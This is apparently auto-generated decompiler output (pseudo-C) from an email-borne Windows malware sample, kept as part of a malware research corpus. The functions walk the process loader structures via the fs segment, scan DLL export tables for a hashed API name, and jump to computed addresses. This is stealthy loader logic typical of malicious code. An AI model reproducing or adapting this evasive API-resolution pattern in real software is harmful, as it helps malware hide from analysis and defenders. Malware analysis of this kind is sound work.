// subject.c
// Generated on 5/4/2015 12:59:34 AM by decompiling malware_via_email/malware_0323/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401030(word32 ecx, selector fs)
{
	fn00401160(0x00000000);
	word32 edi_18;
	word32 edx_19 = fn00401180(fs, out edi_18);
	Mem23[fp + 0x00027CBA - edx_19 + 0x00000030:word32] = edx_19;
	word32 eax_30 = (edx_19 << 0x00000008) + 0xFDC30630 & 0x027C0A00 - (edx_19 << 0x00000008);
	word32 edx_39 = fp + 0xFFFD82E2 + dwLoc20;
	Mem40[edx_39 + 0x00000000:word32] = (eax_30 + 0xF60BF84C)[edx_19 * 0x00000400] - 0x00000028;
	word32 eax_44 = eax_30 + Mem40[((eax_30 + 0xF60BF84C) + (edx_19 << 0x0000000A)) - 0x00000004:word32] + 0x00027D32 - dwLoc20;
	word32 ebx_49 = Mem40[fp + 0xFFFD82D6 + dwLoc20:word32];
	fn00401280(ebx_49);
	word32 ecx_63 = Mem40[fp + 0xFFFD82D6 + dwLoc20:word32];
	fn004011B0(ecx_63, edi_18, dwLoc74);
	(dwLoc20 + 0x003D93F6)();
	word32 v13_81 = eax_44 + 0x00027D3A - dwLoc20;
	v13_81();
	return;
}

void fn00401160(word32 eax)
{
	GetMailslotInfo(eax, 0x00000000, eax, eax, eax);
	return;
}

word32 fn00401180(selector fs, ptr32 ediOut)
{
	word32 edi_6 = fn00401260(fs, 0x00000017);
	word32 edx_12 = Mem0[edi_6 + 0x00000BF4:word32];
	word32 edi_14;
	*ediOut = edi_6 - (edx_12 - 0xBFFD82FE);
	return edx_12 - 0xBFFD82FE;
}

void fn004011B0(word32 ecx, word32 edi, word32 dwArg00)
{
	word32 eax_4 = fn004011C0(ecx, edi);
	fn004011E0(eax_4, ecx);
	eax_4();
	return;
}

word32 fn004011C0(word32 ecx, word32 edi)
{
	return Mem0[Mem0[Mem0[Mem0[Mem0[edi + 0x00000030 + ecx:word32] + 0x0000000C:word32] + 0x0000001C:word32]:word32] + 0x00000008:word32];
}

void fn004011E0(word32 eax, word32 ecx)
{
	word32 esi_24 = Mem0[Mem0[Mem0[eax + ((ecx << 0x00000001) + 0xFFFD8332) - ecx:word32] + eax + 0x00000078:word32] + eax + 0x00000020:word32] + eax;
	Mem32[fp + 0x00027D02 - ecx:word32] = 0x5602F16D - ecx;
	word32 dwLoc0C_36 = 0x00000000;
	while (dwLoc08 != Mem32[((Mem32[esi_24 + dwLoc0C_36:word32] + eax) + 0xFFFD8302) + ecx:word32])
		dwLoc0C_36 = dwLoc0C_36 + 0x00000004;
	return;
}

word32 fn00401260(selector fs, word32 dwArg04)
{
	return Mem0[fs:dwArg04 + 0x00000001:word32];
}

void fn00401280(word32 ebx)
{
	return;
}

